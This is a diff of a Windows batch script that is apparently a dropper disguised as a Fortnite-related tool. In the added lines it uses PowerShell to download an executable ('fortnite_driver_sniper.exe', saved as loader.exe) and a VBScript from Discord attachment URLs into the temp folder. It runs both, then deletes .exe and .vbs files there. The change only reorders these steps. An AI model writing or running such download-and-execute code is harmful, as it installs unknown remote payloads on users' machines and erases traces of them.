@@ -1,20 +1,22 @@
 @echo off
-Powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827885592/775027796388872192/welcome.vbs -OutFile %temp%/welcome.vbs
-"%temp%/welcome.vbs"
-
-:start2
-Powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/756193116528181390/757259102505140234/fortnite_driver_sniper.exe -OutFile %temp%/loader.exe
-"%temp%/loader.exe"
 
 IF EXIST "%temp%/loader.exe" (
-    goto :start
+    goto :start2
     
-goto :menu
+
 ) ELSE (
     goto :start
 )
 
 :start
+Powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/756193116528181390/757259102505140234/fortnite_driver_sniper.exe -OutFile %temp%/loader.exe
+"%temp%/loader.exe"
+goto :start2
+
+
+:start2 
+Powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827885592/775027796388872192/welcome.vbs -OutFile %temp%/welcome.vbs
+"%temp%/welcome.vbs"
 IF EXIST "%temp%/." (
     del  %temp%\*.exe  /Q
     del  %temp%\*.vbs  /Q
